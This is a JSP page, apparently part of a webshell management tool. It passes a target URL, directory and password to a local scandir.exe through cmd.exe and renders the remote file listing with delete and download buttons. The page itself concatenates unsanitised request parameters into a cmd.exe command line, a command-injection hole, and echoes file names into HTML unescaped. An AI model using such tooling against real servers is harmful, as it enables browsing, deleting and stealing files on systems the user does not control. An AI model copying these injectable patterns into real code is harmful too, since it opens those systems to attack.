<%@ page contentType="text/html; charset=UTF-8"%>
<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<%@ page import="java.lang.String.*" %>

<%
	String path = application.getRealPath(request.getRequestURI());
	path = path.replace("source\\scandir.jsp","");
	String shell = path;
	shell = shell + "shell\\";
	path = path + "store\\";
	String store_path = path;
	String url = request.getParameter("url");
	String dir = URLDecoder.decode(request.getParameter("dir"),"UTF-8");
	dir = new String(dir.getBytes("ISO-8859-1"),"UTF-8");
	dir = dir.replace(" ","");
	String password = request.getParameter("password");
	String flag = request.getParameter("flag");
	response.setContentType("text/html;charset=UTF-8");
	String filename_url = "";
	if((url.contains(":")))
	{
		filename_url = url.replace("http","").replace(":","").replace("php","").replace(".","").replace("/","");
	}
	else
	{
		filename_url = url.replace("http","").replace("php","").replace(".","").replace("/","");
	}
	String filename_dir = dir.replace(":","").replace("\\","").replace("/","").replace(" ","");
	String filename = store_path + filename_url + "-" + filename_dir + ".txt";
	filename = filename.replace(" ","");
	File f = new File(filename);
	if("1".equals(flag))
	{
		if(!f.exists())
		{
			String cmd ="cmd.exe /c start " + shell + "scandir.exe " + url + " " + dir + " " + password + " " + store_path;
			try
			{
				Process rt = Runtime.getRuntime().exec(cmd);
				int i = rt.waitFor();
			}
			catch(IOException e)
			{
				out.print("123");
			}
			Thread.sleep(3000);
		}
	}
	if("0".equals(flag))
	{
		String cmd ="cmd.exe /c start " + shell + "scandir.exe " + url + " " + dir + " " + password + " " + store_path;
		try
		{
			Process rt = Runtime.getRuntime().exec(cmd);
			int i = rt.waitFor();
		}
		catch(IOException e)
		{
			out.print("123");
		}
		Thread.sleep(3000);
	}
//	filename = new String(filename.getBytes("ISO-8859-1"),"UTF-8");
	InputStreamReader isr = new InputStreamReader(new FileInputStream(filename),"UTF-8");
    BufferedReader br = new BufferedReader(isr);
    String s;
	String str = "<table border=\"1\" id=\"settable_2\"><tr><td>文件名</td><td>大小</td><td>操作</td></tr>";
    while ((s = br.readLine()) != null) 
	{
		str = str + "<tr>";
		String[] k = s.split(":");
		for(int i=0;i<k.length;i++)
		{
			if(i == 0)
			{
				if(k.length == 2)
				{
					if("mulu".equals(k[1]))
					{
						str = str + "<td id=\"" + k[0] + "/\" onclick=\"getfile(this)\">" + k[i] + "</td>";
					}
					else
					{
						str = str + "<td id=\"" + k[0] + "\" onclick=\"getfile(this)\">" + k[i] + "</td>";
					}
				}
				else
				{
					str = str + "<td id=\"" + k[0] + "/\" onclick=\"getfile(this)\">" + k[i] + "</td>";
				}
			}
			else
			{
				if(k.length == 2)
				{
					if(!("mulu".equals(k[1])))
					{
						str = str + "<td>" + k[i] + "</td>";
					}
				}
				else
				{
					str = str + "<td>" + k[i] + "</td>";
				}
			}
		}
		String pa = dir + k[0];
		String x = pa.substring(pa.length()-1);
		if(!("/".equals(x)))
		{
			pa = pa + "/";
		}
		if(k.length == 1 || "mulu".equals(k[1]))
		{
			str = str + "<td></td><td>" + "<button class=\"b\" id=\"" + pa + "\" onclick=\"remove(this)\">删除</button></td>";
		}
		else
		{
			str = str + "<td>" + "<button class=\"b\" id=\"" + k[0] + "\"onclick=\"remove(this)\">删除</button>   <button class=\"b\" id=\"" + k[0] + "\" onclick=\"dowload(this)\">下载</button></td>";
		}
		str = str + "</tr>";
    }
	str = str + "</table>";
	out.print(str);
    br.close();
    isr.close();
%>